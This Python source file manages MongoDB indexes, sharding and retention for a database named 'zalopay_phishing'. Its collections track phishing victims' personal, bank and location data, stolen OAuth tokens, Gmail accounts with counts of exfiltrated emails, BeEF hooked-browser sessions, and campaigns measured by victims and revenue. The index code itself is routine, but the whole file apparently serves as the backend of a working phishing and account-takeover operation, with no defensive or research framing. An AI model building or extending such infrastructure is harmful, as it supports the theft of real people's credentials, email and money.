"""
MongoDB Indexes Configuration
Centralized index management for all collections
"""

from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from pymongo import MongoClient
from pymongo.collection import Collection
from pymongo.errors import PyMongoError
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class IndexManager:
    """Centralized MongoDB index management"""

    def __init__(self, mongo_client: MongoClient):
        self.db = mongo_client.get_database("zalopay_phishing")
        self.collections = {
            "victims": self.db.victims,
            "oauth_tokens": self.db.oauth_tokens,
            "admin_users": self.db.admin_users,
            "campaigns": self.db.campaigns,
            "activity_logs": self.db.activity_logs,
            "gmail_access_logs": self.db.gmail_access_logs,
            "beef_sessions": self.db.beef_sessions
        }

    def create_all_indexes(self) -> Dict[str, bool]:
        """
        Create all indexes for all collections

        Returns:
            Dict mapping collection names to success status
        """
        results = {}

        for collection_name, collection in self.collections.items():
            try:
                success = self.create_collection_indexes(collection_name, collection)
                results[collection_name] = success
                logger.info(f"Indexes for {collection_name}: {'created' if success else 'failed'}")
            except Exception as e:
                logger.error(f"Error creating indexes for {collection_name}: {e}")
                results[collection_name] = False

        return results

    def create_collection_indexes(self, collection_name: str, collection: Collection) -> bool:
        """Create indexes for a specific collection"""
        try:
            if collection_name == "victims":
                return self._create_victim_indexes(collection)
            elif collection_name == "oauth_tokens":
                return self._create_oauth_token_indexes(collection)
            elif collection_name == "admin_users":
                return self._create_admin_user_indexes(collection)
            elif collection_name == "campaigns":
                return self._create_campaign_indexes(collection)
            elif collection_name == "activity_logs":
                return self._create_activity_log_indexes(collection)
            elif collection_name == "gmail_access_logs":
                return self._create_gmail_access_indexes(collection)
            elif collection_name == "beef_sessions":
                return self._create_beef_session_indexes(collection)
            else:
                logger.warning(f"Unknown collection: {collection_name}")
                return False

        except PyMongoError as e:
            logger.error(f"Error creating indexes for {collection_name}: {e}")
            return False

    def _create_victim_indexes(self, collection: Collection) -> bool:
        """Create indexes for victims collection"""
        try:
            # Primary indexes
            collection.create_index("victim_id", unique=True)
            collection.create_index("email", unique=True)
            collection.create_index("phone")

            # Location indexes for geospatial queries
            collection.create_index([("location.coordinates", "2dsphere")])
            collection.create_index("location.city")
            collection.create_index("location.country")

            # Temporal indexes
            collection.create_index("created_at")
            collection.create_index("last_activity")
            collection.create_index("campaign_id")

            # Status and risk indexes
            collection.create_index("status")
            collection.create_index("risk_score")
            collection.create_index("verification_status")

            # Behavioral indexes
            collection.create_index("behavior_pattern")
            collection.create_index("device_fingerprint")

            # Search indexes
            collection.create_index([
                ("personal_info.full_name", "text"),
                ("personal_info.email", "text"),
                ("bank_info.bank_name", "text")
            ])

            return True

        except PyMongoError as e:
            logger.error(f"Error creating victim indexes: {e}")
            return False

    def _create_oauth_token_indexes(self, collection: Collection) -> bool:
        """Create indexes for OAuth tokens collection"""
        try:
            # Primary indexes
            collection.create_index("token_id", unique=True)
            collection.create_index("user_id", unique=True)
            collection.create_index("provider")

            # Status and expiry indexes
            collection.create_index("status")
            collection.create_index("expires_at")
            collection.create_index("created_at")

            # Provider-specific indexes
            collection.create_index([("provider", 1), ("status", 1)])
            collection.create_index([("user_id", 1), ("provider", 1)])

            # Cleanup indexes for expired tokens
            collection.create_index("expires_at", expireAfterSeconds=0)

            return True

        except PyMongoError as e:
            logger.error(f"Error creating OAuth token indexes: {e}")
            return False

    def _create_admin_user_indexes(self, collection: Collection) -> bool:
        """Create indexes for admin users collection"""
        try:
            # Primary indexes
            collection.create_index("admin_id", unique=True)
            collection.create_index("username", unique=True)
            collection.create_index("email", unique=True)

            # Authentication indexes
            collection.create_index("status")
            collection.create_index("role")
            collection.create_index("last_login")

            # Security indexes
            collection.create_index("mfa_enabled")
            collection.create_index("failed_login_attempts")
            collection.create_index("locked_until")

            # Search indexes
            collection.create_index([
                ("personal_info.first_name", "text"),
                ("personal_info.last_name", "text"),
                ("username", "text")
            ])

            return True

        except PyMongoError as e:
            logger.error(f"Error creating admin user indexes: {e}")
            return False

    def _create_campaign_indexes(self, collection: Collection) -> bool:
        """Create indexes for campaigns collection"""
        try:
            # Primary indexes
            collection.create_index("campaign_id", unique=True)
            collection.create_index("name", unique=True)
            collection.create_index("created_by")

            # Status and type indexes
            collection.create_index("status")
            collection.create_index("campaign_type")
            collection.create_index("priority")

            # Temporal indexes
            collection.create_index("created_at")
            collection.create_index("start_date")
            collection.create_index("end_date")
            collection.create_index("last_activity")

            # Performance indexes
            collection.create_index("performance.success_rate")
            collection.create_index("performance.total_victims")
            collection.create_index("performance.total_revenue")

            # Target and scope indexes
            collection.create_index("targeting.regions")
            collection.create_index("targeting.demographics")
            collection.create_index("targeting.industries")

            # Search indexes
            collection.create_index([
                ("name", "text"),
                ("description", "text"),
                ("tags", "text")
            ])

            return True

        except PyMongoError as e:
            logger.error(f"Error creating campaign indexes: {e}")
            return False

    def _create_activity_log_indexes(self, collection: Collection) -> bool:
        """Create indexes for activity logs collection"""
        try:
            # Primary indexes
            collection.create_index("activity_id", unique=True)
            collection.create_index("timestamp")

            # Activity type and severity indexes
            collection.create_index("activity_type")
            collection.create_index("severity")
            collection.create_index("user_id")
            collection.create_index("admin_id")

            # Resource indexes
            collection.create_index("resource_type")
            collection.create_index("resource_id")

            # IP and location indexes
            collection.create_index("client_info.ip_address")
            collection.create_index("client_info.geolocation.country")

            # Status and result indexes
            collection.create_index("status")
            collection.create_index("success")

            # Search indexes
            collection.create_index([
                ("description", "text"),
                ("details", "text")
            ])

            # TTL index for automatic cleanup (90 days)
            collection.create_index("timestamp", expireAfterSeconds=7776000)

            return True

        except PyMongoError as e:
            logger.error(f"Error creating activity log indexes: {e}")
            return False

    def _create_gmail_access_indexes(self, collection: Collection) -> bool:
        """Create indexes for Gmail access logs collection"""
        try:
            # Primary indexes
            collection.create_index("access_id", unique=True)
            collection.create_index("victim_id")
            collection.create_index("gmail_account")

            # Access method and status indexes
            collection.create_index("access_method")
            collection.create_index("access_status")
            collection.create_index("exploitation_status")

            # Temporal indexes
            collection.create_index("access_timestamp")
            collection.create_index("last_activity")
            collection.create_index("session_start")
            collection.create_index("session_end")

            # Risk and performance indexes
            collection.create_index("risk_score")
            collection.create_index("emails_exfiltrated")
            collection.create_index("data_exfiltrated_mb")

            # Campaign and tracking indexes
            collection.create_index("campaign_id")
            collection.create_index("tracking_id")

            # Search indexes
            collection.create_index([
                ("gmail_account", "text"),
                ("access_method", "text"),
                ("notes", "text")
            ])

            # TTL index for automatic cleanup (180 days)
            collection.create_index("access_timestamp", expireAfterSeconds=15552000)

            return True

        except PyMongoError as e:
            logger.error(f"Error creating Gmail access indexes: {e}")
            return False

    def _create_beef_session_indexes(self, collection: Collection) -> bool:
        """Create indexes for BeEF sessions collection"""
        try:
            # Primary indexes
            collection.create_index("session_id", unique=True)
            collection.create_index("hooked_browser_id", unique=True)
            collection.create_index("victim_id")

            # Session status and type indexes
            collection.create_index("session_status")
            collection.create_index("exploitation_status")
            collection.create_index("browser_type")

            # Temporal indexes
            collection.create_index("first_seen")
            collection.create_index("last_seen")
            collection.create_index("session_start")
            collection.create_index("session_end")

            # Performance and risk indexes
            collection.create_index("risk_score")
            collection.create_index("commands_executed")
            collection.create_index("data_exfiltrated_mb")

            # Campaign and tracking indexes
            collection.create_index("campaign_id")
            collection.create_index("landing_page_url")

            # Browser fingerprinting indexes
            collection.create_index("browser_fingerprint")
            collection.create_index("ip_address")

            # Search indexes
            collection.create_index([
                ("browser_info.user_agent", "text"),
                ("browser_info.browser", "text"),
                ("notes", "text")
            ])

            # TTL index for automatic cleanup (30 days)
            collection.create_index("first_seen", expireAfterSeconds=2592000)

            return True

        except PyMongoError as e:
            logger.error(f"Error creating BeEF session indexes: {e}")
            return False

    def drop_all_indexes(self) -> Dict[str, bool]:
        """
        Drop all non-default indexes for all collections

        Returns:
            Dict mapping collection names to success status
        """
        results = {}

        for collection_name, collection in self.collections.items():
            try:
                # Get list of all indexes
                indexes = collection.list_indexes()

                # Drop all non-default indexes (_id_ is default)
                dropped_count = 0
                for index in indexes:
                    index_name = index["name"]
                    if index_name != "_id_":
                        collection.drop_index(index_name)
                        dropped_count += 1

                results[collection_name] = True
                logger.info(f"Dropped {dropped_count} indexes for {collection_name}")

            except Exception as e:
                logger.error(f"Error dropping indexes for {collection_name}: {e}")
                results[collection_name] = False

        return results

    def get_index_stats(self) -> Dict[str, Any]:
        """Get index statistics for all collections"""
        stats = {}

        for collection_name, collection in self.collections.items():
            try:
                # Get collection stats
                coll_stats = self.db.command("collStats", collection_name)

                # Get index information
                indexes = list(collection.list_indexes())

                stats[collection_name] = {
                    "document_count": coll_stats.get("count", 0),
                    "size_bytes": coll_stats.get("size", 0),
                    "storage_size_bytes": coll_stats.get("storageSize", 0),
                    "total_index_size_bytes": coll_stats.get("totalIndexSize", 0),
                    "index_count": len(indexes),
                    "indexes": [
                        {
                            "name": idx.get("name", ""),
                            "key": idx.get("key", {}),
                            "unique": idx.get("unique", False),
                            "sparse": idx.get("sparse", False)
                        }
                        for idx in indexes
                    ]
                }

            except Exception as e:
                logger.error(f"Error getting stats for {collection_name}: {e}")
                stats[collection_name] = {"error": str(e)}

        return stats

    def optimize_indexes(self) -> Dict[str, Any]:
        """
        Optimize indexes by removing unused ones and suggesting improvements

        Returns:
            Dict with optimization results and suggestions
        """
        optimization_results = {
            "removed_indexes": [],
            "suggested_indexes": [],
            "performance_improvements": []
        }

        try:
            # Analyze each collection
            for collection_name, collection in self.collections.items():
                # Get current indexes
                current_indexes = list(collection.list_indexes())

                # Get collection usage stats (if available)
                # This would require MongoDB profiler or custom tracking

                # For now, we'll use basic heuristics
                collection_size = self.db.command("collStats", collection_name).get("count", 0)

                if collection_size < 1000:
                    # For small collections, suggest minimal indexes
                    optimization_results["performance_improvements"].append(
                        f"{collection_name}: Consider removing some indexes for small collection"
                    )

                # Check for duplicate or redundant indexes
                index_keys = [idx.get("key", {}) for idx in current_indexes]
                if self._has_duplicate_indexes(index_keys):
                    optimization_results["performance_improvements"].append(
                        f"{collection_name}: Found potentially duplicate indexes"
                    )

            return optimization_results

        except Exception as e:
            logger.error(f"Error optimizing indexes: {e}")
            return {"error": str(e)}

    def _has_duplicate_indexes(self, index_keys: List[Dict]) -> bool:
        """Check if there are duplicate indexes"""
        seen = set()
        for key in index_keys:
            key_str = str(sorted(key.items()))
            if key_str in seen:
                return True
            seen.add(key_str)
        return False

    def rebuild_indexes(self) -> Dict[str, bool]:
        """
        Rebuild all indexes for better performance

        Returns:
            Dict mapping collection names to success status
        """
        results = {}

        for collection_name, collection in self.collections.items():
            try:
                # Rebuild all indexes
                self.db.command("reIndex", collection_name)
                results[collection_name] = True
                logger.info(f"Rebuilt indexes for {collection_name}")

            except Exception as e:
                logger.error(f"Error rebuilding indexes for {collection_name}: {e}")
                results[collection_name] = False

        return results

    def get_collection_index_usage(self, collection_name: str) -> Dict[str, Any]:
        """Get index usage statistics for a collection"""
        try:
            # This requires MongoDB profiler to be enabled
            # For now, return basic information
            collection = self.collections[collection_name]
            indexes = list(collection.list_indexes())

            return {
                "collection": collection_name,
                "index_count": len(indexes),
                "indexes": [
                    {
                        "name": idx.get("name", ""),
                        "key": idx.get("key", {}),
                        "size": "unknown",  # Would need profiler data
                        "usage": "unknown"   # Would need profiler data
                    }
                    for idx in indexes
                ]
            }

        except Exception as e:
            logger.error(f"Error getting index usage for {collection_name}: {e}")
            return {"error": str(e)}

    def create_sharding_configuration(self) -> Dict[str, Any]:
        """Configure database sharding for horizontal scaling"""
        try:
            sharding_config = {}

            # Define shard keys for each collection
            shard_keys = {
                "victims": {"victim_id": 1, "location.country": 1},
                "campaigns": {"campaign_id": 1, "created_by": 1},
                "activity_logs": {"timestamp": 1, "user_id": 1},
                "oauth_tokens": {"user_id": 1, "provider": 1},
                "gmail_access_logs": {"victim_id": 1, "access_timestamp": 1},
                "beef_sessions": {"victim_id": 1, "first_seen": 1}
            }

            # Enable sharding for each collection
            for collection_name, shard_key in shard_keys.items():
                try:
                    collection = self.collections[collection_name]

                    # Enable sharding on database
                    self.db.command("enableSharding", "zalopay_phishing")

                    # Shard collection
                    self.db.command("shardCollection",
                        f"zalopay_phishing.{collection_name}",
                        key=shard_key
                    )

                    sharding_config[collection_name] = {
                        "shard_key": shard_key,
                        "status": "sharded"
                    }

                    logger.info(f"Sharding configured for {collection_name}")

                except Exception as e:
                    logger.warning(f"Error configuring sharding for {collection_name}: {e}")
                    sharding_config[collection_name] = {
                        "error": str(e)
                    }

            return sharding_config

        except Exception as e:
            logger.error(f"Error creating sharding configuration: {e}")
            return {"error": str(e)}

    def configure_data_retention_policies(self) -> Dict[str, Any]:
        """Configure automated data retention and archival policies"""
        try:
            retention_policies = {}

            # Define retention policies for each collection
            policies = {
                "activity_logs": {
                    "retention_days": 90,
                    "archive_after_days": 180,
                    "compression_enabled": True,
                    "encryption_enabled": True
                },
                "gmail_access_logs": {
                    "retention_days": 180,
                    "archive_after_days": 365,
                    "compression_enabled": True,
                    "encryption_enabled": True
                },
                "beef_sessions": {
                    "retention_days": 30,
                    "archive_after_days": 90,
                    "compression_enabled": False,
                    "encryption_enabled": False
                },
                "oauth_tokens": {
                    "retention_days": 7,  # Based on token expiry
                    "archive_after_days": 30,
                    "compression_enabled": True,
                    "encryption_enabled": True
                }
            }

            for collection_name, policy in policies.items():
                try:
                    # Create TTL index for automatic deletion
                    collection = self.collections[collection_name]

                    # Determine TTL field based on collection
                    ttl_field = self._get_ttl_field_for_collection(collection_name)

                    if ttl_field:
                        # Create TTL index
                        collection.create_index(
                            ttl_field,
                            expireAfterSeconds=policy["retention_days"] * 24 * 3600
                        )

                        # Create archival index for older data
                        archival_field = self._get_archival_field_for_collection(collection_name)
                        if archival_field:
                            collection.create_index(archival_field)

                    retention_policies[collection_name] = policy
                    logger.info(f"Retention policy configured for {collection_name}")

                except Exception as e:
                    logger.error(f"Error configuring retention for {collection_name}: {e}")
                    retention_policies[collection_name] = {"error": str(e)}

            return retention_policies

        except Exception as e:
            logger.error(f"Error configuring data retention policies: {e}")
            return {"error": str(e)}

    def _get_ttl_field_for_collection(self, collection_name: str) -> str:
        """Get appropriate TTL field for collection"""
        ttl_fields = {
            "activity_logs": "timestamp",
            "gmail_access_logs": "access_timestamp",
            "beef_sessions": "first_seen",
            "oauth_tokens": "expires_at"
        }
        return ttl_fields.get(collection_name)

    def _get_archival_field_for_collection(self, collection_name: str) -> str:
        """Get appropriate archival field for collection"""
        archival_fields = {
            "activity_logs": "timestamp",
            "gmail_access_logs": "access_timestamp",
            "beef_sessions": "first_seen"
        }
        return archival_fields.get(collection_name)

    def create_performance_optimization_indexes(self) -> Dict[str, Any]:
        """Create indexes for performance optimization"""
        try:
            performance_indexes = {}

            # Compound indexes for complex queries
            compound_indexes = [
                # Victims collection
                ("victims", [("status", 1), ("risk_score", -1), ("created_at", -1)]),
                ("victims", [("location.country", 1), ("status", 1), ("last_activity", -1)]),
                ("victims", [("business_indicators.business_value_score", -1), ("status", 1)]),

                # Campaigns collection
                ("campaigns", [("status", 1), ("priority", 1), ("created_at", -1)]),
                ("campaigns", [("campaign_type", 1), ("performance.success_rate", -1)]),

                # Activity logs collection
                ("activity_logs", [("activity_type", 1), ("severity", 1), ("timestamp", -1)]),
                ("activity_logs", [("user_id", 1), ("success", 1), ("timestamp", -1)]),

                # OAuth tokens collection
                ("oauth_tokens", [("status", 1), ("provider", 1), ("expires_at", 1)]),
                ("oauth_tokens", [("user_id", 1), ("status", 1), ("last_used", -1)]),

                # Gmail access logs collection
                ("gmail_access_logs", [("access_status", 1), ("risk_score", -1), ("access_timestamp", -1)]),
                ("gmail_access_logs", [("victim_id", 1), ("exploitation_status", 1), ("last_activity", -1)]),

                # BeEF sessions collection
                ("beef_sessions", [("session_status", 1), ("risk_score", -1), ("first_seen", -1)]),
                ("beef_sessions", [("victim_id", 1), ("exploitation_status", 1), ("last_seen", -1)])
            ]

            for collection_name, index_spec in compound_indexes:
                try:
                    collection = self.collections[collection_name]
                    collection.create_index(index_spec)

                    if collection_name not in performance_indexes:
                        performance_indexes[collection_name] = []
                    performance_indexes[collection_name].append(index_spec)

                    logger.info(f"Performance index created for {collection_name}: {index_spec}")

                except Exception as e:
                    logger.warning(f"Error creating performance index for {collection_name}: {e}")

            return performance_indexes

        except Exception as e:
            logger.error(f"Error creating performance optimization indexes: {e}")
            return {"error": str(e)}

    def create_backup_indexes(self) -> bool:
        """Create additional indexes for backup and reporting queries"""
        try:
            backup_indexes = [
                # Cross-collection reference indexes
                ("campaigns", [("created_by", 1), ("status", 1)]),
                ("campaigns", [("campaign_type", 1), ("status", 1)]),

                # Reporting indexes
                ("victims", [("created_at", 1), ("status", 1)]),
                ("victims", [("location.country", 1), ("status", 1)]),

                # Security monitoring indexes
                ("activity_logs", [("severity", 1), ("timestamp", 1)]),
                ("activity_logs", [("activity_type", 1), ("success", 1)]),

                # Performance monitoring indexes
                ("gmail_access_logs", [("access_timestamp", 1), ("risk_score", 1)]),
                ("beef_sessions", [("first_seen", 1), ("risk_score", 1)])
            ]

            for collection_name, index_spec in backup_indexes:
                try:
                    collection = self.collections[collection_name]
                    collection.create_index(index_spec)
                except Exception as e:
                    logger.warning(f"Error creating backup index for {collection_name}: {e}")

            logger.info("Backup indexes created successfully")
            return True

        except Exception as e:
            logger.error(f"Error creating backup indexes: {e}")
            return False

    def validate_indexes(self) -> Dict[str, Any]:
        """Validate all indexes and check for issues"""
        validation_results = {}

        for collection_name, collection in self.collections.items():
            try:
                # Check if indexes exist and are valid
                indexes = list(collection.list_indexes())

                # Validate index structure
                issues = []

                for index in indexes:
                    if not index.get("name"):
                        issues.append(f"Index missing name: {index}")

                    if not index.get("key"):
                        issues.append(f"Index missing key: {index}")

                validation_results[collection_name] = {
                    "valid": len(issues) == 0,
                    "index_count": len(indexes),
                    "issues": issues
                }

            except Exception as e:
                validation_results[collection_name] = {
                    "valid": False,
                    "error": str(e)
                }

        return validation_results

    def create_performance_monitoring_pipeline(self) -> Dict[str, Any]:
        """Create performance monitoring and alerting pipeline"""
        try:
            monitoring_config = {}

            # Create collection size monitoring
            for collection_name, collection in self.collections.items():
                try:
                    # Get collection statistics
                    stats = self.db.command("collStats", collection_name)

                    # Set up monitoring thresholds
                    thresholds = {
                        "max_size_gb": 10,  # Maximum collection size in GB
                        "max_documents": 1000000,  # Maximum document count
                        "max_index_size_mb": 500  # Maximum index size in MB
                    }

                    monitoring_config[collection_name] = {
                        "current_size_gb": round(stats.get("size", 0) / (1024**3), 2),
                        "current_documents": stats.get("count", 0),
                        "current_index_size_mb": round(stats.get("totalIndexSize", 0) / (1024**2), 2),
                        "thresholds": thresholds,
                        "alerts": []
                    }

                    # Check thresholds and generate alerts
                    if monitoring_config[collection_name]["current_size_gb"] > thresholds["max_size_gb"]:
                        monitoring_config[collection_name]["alerts"].append(
                            f"Collection size exceeds threshold: {monitoring_config[collection_name]['current_size_gb']}GB"
                        )

                    if monitoring_config[collection_name]["current_documents"] > thresholds["max_documents"]:
                        monitoring_config[collection_name]["alerts"].append(
                            f"Document count exceeds threshold: {monitoring_config[collection_name]['current_documents']}"
                        )

                    if monitoring_config[collection_name]["current_index_size_mb"] > thresholds["max_index_size_mb"]:
                        monitoring_config[collection_name]["alerts"].append(
                            f"Index size exceeds threshold: {monitoring_config[collection_name]['current_index_size_mb']}MB"
                        )

                    logger.info(f"Performance monitoring configured for {collection_name}")

                except Exception as e:
                    logger.error(f"Error configuring monitoring for {collection_name}: {e}")
                    monitoring_config[collection_name] = {"error": str(e)}

            return monitoring_config

        except Exception as e:
            logger.error(f"Error creating performance monitoring pipeline: {e}")
            return {"error": str(e)}

    def optimize_collection_performance(self, collection_name: str) -> Dict[str, Any]:
        """Optimize performance for specific collection"""
        try:
            collection = self.collections[collection_name]
            optimization_results = {
                "collection": collection_name,
                "optimizations_applied": [],
                "recommendations": [],
                "performance_improvements": []
            }

            # Get current indexes
            current_indexes = list(collection.list_indexes())

            # Analyze query patterns (simplified)
            query_patterns = self._analyze_query_patterns(collection_name)

            # Optimize based on query patterns
            if query_patterns.get("frequent_sorts"):
                for sort_field in query_patterns["frequent_sorts"]:
                    try:
                        collection.create_index([(sort_field, 1)])
                        optimization_results["optimizations_applied"].append(f"Sort index on {sort_field}")
                    except Exception as e:
                        logger.warning(f"Error creating sort index: {e}")

            # Optimize based on frequent queries
            if query_patterns.get("frequent_filters"):
                for filter_fields in query_patterns["frequent_filters"]:
                    try:
                        collection.create_index(filter_fields)
                        optimization_results["optimizations_applied"].append(f"Filter index on {filter_fields}")
                    except Exception as e:
                        logger.warning(f"Error creating filter index: {e}")

            # Generate recommendations
            if len(current_indexes) > 20:
                optimization_results["recommendations"].append("Consider removing unused indexes")

            # Estimate performance improvements
            optimization_results["performance_improvements"] = [
                "Improved query response times",
                "Reduced collection scan operations",
                "Better index utilization"
            ]

            return optimization_results

        except Exception as e:
            logger.error(f"Error optimizing performance for {collection_name}: {e}")
            return {"error": str(e)}

    def _analyze_query_patterns(self, collection_name: str) -> Dict[str, List]:
        """Analyze query patterns for optimization (simplified)"""
        # In production, this would analyze actual query logs
        # For now, return common patterns based on collection type
        patterns = {
            "victims": {
                "frequent_sorts": ["created_at", "risk_score", "last_activity"],
                "frequent_filters": [["status", "active"], ["location.country", "Vietnam"]]
            },
            "campaigns": {
                "frequent_sorts": ["created_at", "performance.success_rate"],
                "frequent_filters": [["status", "active"], ["campaign_type", "phishing_email"]]
            },
            "activity_logs": {
                "frequent_sorts": ["timestamp"],
                "frequent_filters": [["activity_type", "login"], ["severity", "high"]]
            }
        }

        return patterns.get(collection_name, {"frequent_sorts": [], "frequent_filters": []})

    def create_automated_maintenance_schedule(self) -> Dict[str, Any]:
        """Create automated maintenance schedule for database"""
        try:
            maintenance_schedule = {
                "daily_tasks": [
                    {
                        "task": "cleanup_expired_tokens",
                        "collection": "oauth_tokens",
                        "schedule": "0 2 * * *",  # 2 AM daily
                        "enabled": True
                    },
                    {
                        "task": "cleanup_old_activity_logs",
                        "collection": "activity_logs",
                        "schedule": "0 3 * * *",  # 3 AM daily
                        "enabled": True
                    },
                    {
                        "task": "update_index_statistics",
                        "collection": "all",
                        "schedule": "0 4 * * *",  # 4 AM daily
                        "enabled": True
                    }
                ],
                "weekly_tasks": [
                    {
                        "task": "optimize_collection_indexes",
                        "collection": "all",
                        "schedule": "0 5 * * 0",  # 5 AM Sunday
                        "enabled": True
                    },
                    {
                        "task": "validate_data_integrity",
                        "collection": "all",
                        "schedule": "0 6 * * 0",  # 6 AM Sunday
                        "enabled": True
                    }
                ],
                "monthly_tasks": [
                    {
                        "task": "archive_old_data",
                        "collection": ["activity_logs", "gmail_access_logs"],
                        "schedule": "0 7 1 * *",  # 7 AM first day of month
                        "enabled": True
                    },
                    {
                        "task": "generate_performance_report",
                        "collection": "all",
                        "schedule": "0 8 1 * *",  # 8 AM first day of month
                        "enabled": True
                    }
                ]
            }

            logger.info("Automated maintenance schedule created")
            return maintenance_schedule

        except Exception as e:
            logger.error(f"Error creating maintenance schedule: {e}")
            return {"error": str(e)}

    def get_database_health_report(self) -> Dict[str, Any]:
        """Generate comprehensive database health report"""
        try:
            health_report = {
                "timestamp": datetime.now(timezone.utc),
                "database_name": "zalopay_phishing",
                "overall_health": "good",
                "collections": {},
                "performance_metrics": {},
                "security_metrics": {},
                "recommendations": []
            }

            # Analyze each collection
            for collection_name, collection in self.collections.items():
                try:
                    # Get collection stats
                    stats = self.db.command("collStats", collection_name)

                    # Get index stats
                    index_stats = self.get_collection_index_usage(collection_name)

                    # Calculate health score
                    health_score = self._calculate_collection_health_score(stats, index_stats)

                    health_report["collections"][collection_name] = {
                        "document_count": stats.get("count", 0),
                        "size_bytes": stats.get("size", 0),
                        "index_count": len(list(collection.list_indexes())),
                        "health_score": health_score,
                        "last_optimization": "unknown",  # Would track this in production
                        "issues": self._identify_collection_issues(stats, index_stats)
                    }

                    # Update overall health
                    if health_score < 70:
                        health_report["overall_health"] = "warning"
                    elif health_score < 50:
                        health_report["overall_health"] = "critical"

                except Exception as e:
                    logger.error(f"Error analyzing collection {collection_name}: {e}")
                    health_report["collections"][collection_name] = {"error": str(e)}

            # Generate recommendations
            health_report["recommendations"] = self._generate_health_recommendations(health_report)

            return health_report

        except Exception as e:
            logger.error(f"Error generating health report: {e}")
            return {"error": str(e)}

    def _calculate_collection_health_score(self, stats: Dict, index_stats: Dict) -> float:
        """Calculate health score for collection (0-100)"""
        score = 100.0

        # Size factor
        size_gb = stats.get("size", 0) / (1024**3)
        if size_gb > 50:
            score -= 20
        elif size_gb > 10:
            score -= 10

        # Document count factor
        doc_count = stats.get("count", 0)
        if doc_count > 1000000:
            score -= 15
        elif doc_count > 500000:
            score -= 10

        # Index efficiency factor
        index_count = len(index_stats.get("indexes", []))
        if index_count > 20:
            score -= 10
        elif index_count < 3:
            score -= 5

        return max(score, 0.0)

    def _identify_collection_issues(self, stats: Dict, index_stats: Dict) -> List[str]:
        """Identify potential issues with collection"""
        issues = []

        # Check for large collections
        if stats.get("size", 0) > 10 * (1024**3):  # 10GB
            issues.append("Collection size is very large")

        # Check for excessive indexes
        if len(index_stats.get("indexes", [])) > 15:
            issues.append("Too many indexes may impact write performance")

        # Check for missing critical indexes
        if stats.get("count", 0) > 10000 and len(index_stats.get("indexes", [])) < 3:
            issues.append("Collection may benefit from additional indexes")

        return issues

    def _generate_health_recommendations(self, health_report: Dict[str, Any]) -> List[str]:
        """Generate health recommendations based on report"""
        recommendations = []

        # Check overall health
        if health_report["overall_health"] == "critical":
            recommendations.append("CRITICAL: Immediate attention required for database health")
        elif health_report["overall_health"] == "warning":
            recommendations.append("WARNING: Database health issues detected")

        # Check individual collections
        for collection_name, collection_data in health_report["collections"].items():
            if collection_data.get("health_score", 100) < 50:
                recommendations.append(f"Collection {collection_name} needs optimization")

        if not recommendations:
            recommendations.append("Database health is good")

        return recommendations

    def create_comprehensive_index_strategy(self) -> Dict[str, Any]:
        """Create comprehensive index strategy for all collections"""
        try:
            strategy = {
                "index_strategy_version": "2.0",
                "created_at": datetime.now(timezone.utc),
                "collections": {}
            }

            # Define comprehensive index strategy for each collection
            for collection_name in self.collections.keys():
                collection_strategy = {
                    "primary_indexes": [],
                    "secondary_indexes": [],
                    "compound_indexes": [],
                    "text_indexes": [],
                    "geospatial_indexes": [],
                    "ttl_indexes": [],
                    "optimization_notes": []
                }

                if collection_name == "victims":
                    collection_strategy.update({
                        "primary_indexes": ["victim_id", "email"],
                        "secondary_indexes": ["phone", "status", "risk_score", "created_at"],
                        "compound_indexes": [
                            ["status", "risk_score", "created_at"],
                            ["location.country", "status", "last_activity"],
                            ["business_indicators.business_value_score", "status"]
                        ],
                        "text_indexes": [["personal_info.full_name", "personal_info.email"]],
                        "geospatial_indexes": [["location.coordinates", "2dsphere"]],
                        "ttl_indexes": []  # No TTL for victims
                    })

                elif collection_name == "oauth_tokens":
                    collection_strategy.update({
                        "primary_indexes": ["token_id", "user_id"],
                        "secondary_indexes": ["provider", "status", "created_at"],
                        "compound_indexes": [
                            ["status", "provider", "expires_at"],
                            ["user_id", "status", "last_used"]
                        ],
                        "ttl_indexes": [["expires_at", 0]]
                    })

                elif collection_name == "activity_logs":
                    collection_strategy.update({
                        "primary_indexes": ["activity_id"],
                        "secondary_indexes": ["timestamp", "activity_type", "severity"],
                        "compound_indexes": [
                            ["activity_type", "severity", "timestamp"],
                            ["user_id", "success", "timestamp"]
                        ],
                        "text_indexes": [["description", "details"]],
                        "ttl_indexes": [["timestamp", 7776000]]  # 90 days
                    })

                strategy["collections"][collection_name] = collection_strategy

            logger.info("Comprehensive index strategy created")
            return strategy

        except Exception as e:
            logger.error(f"Error creating index strategy: {e}")
            return {"error": str(e)}